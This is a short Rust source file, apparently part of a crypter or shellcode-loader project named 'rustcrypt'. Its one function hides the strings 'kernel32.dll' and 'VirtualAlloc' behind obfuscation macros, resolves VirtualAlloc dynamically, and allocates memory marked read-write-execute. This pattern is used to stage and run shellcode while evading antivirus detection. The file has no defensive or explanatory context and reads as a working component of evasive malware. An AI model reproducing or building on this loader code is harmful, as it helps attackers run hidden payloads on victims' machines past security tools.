use crate::utils::{load_library, get_proc_address};
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    // Define function pointer type
    type VirtualAllocFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_allocation_type: u32, fl_protect: u32) -> *mut c_void;

    // Load kernel32.dll
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let virtual_alloc: VirtualAllocFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualAlloc\0").as_slice())?);

    let p = virtual_alloc(core::ptr::null_mut(), size, 0x00001000, 0x40) as *mut u8; // MEM_COMMIT, PAGE_EXECUTE_READWRITE
    if p.is_null() {
        return Err(obf_lit!("VirtualAlloc failed").to_string());
    }
    Ok(p)
}